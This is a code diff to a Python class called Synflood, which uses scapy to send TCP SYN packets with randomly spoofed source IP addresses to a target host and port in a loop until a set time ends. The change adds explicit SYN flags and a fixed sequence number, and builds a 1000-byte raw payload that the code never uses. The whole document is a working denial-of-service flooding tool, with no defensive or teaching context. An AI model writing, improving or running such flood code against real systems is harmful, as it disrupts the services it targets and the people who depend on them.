@@ -2,7 +2,7 @@
 
 import random
 import threading
-from scapy.all import IP, TCP, send
+from scapy.all import IP, TCP, send, Raw
 import threading
 import socket
 import time
@@ -23,13 +23,14 @@ class Synflood:
         self.event = threading.Event()
         #self.packet = pack
         self.time = time.time() + time_end
-    def start(self, port="80"):
+    def start(self):
         self.event.set()
         while time.time() < self.time:
 
             fake_ip = "%d.%d.%d.%d" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
             rand_port = random.randint(0, 65535)
-            send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port), verbose=0)
+            raw = Raw(b"X" * 1000)
+            send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port, seq=1505066, flags="S"), verbose=0)
         self.event.clear()
         print("Thread finished\n")
 
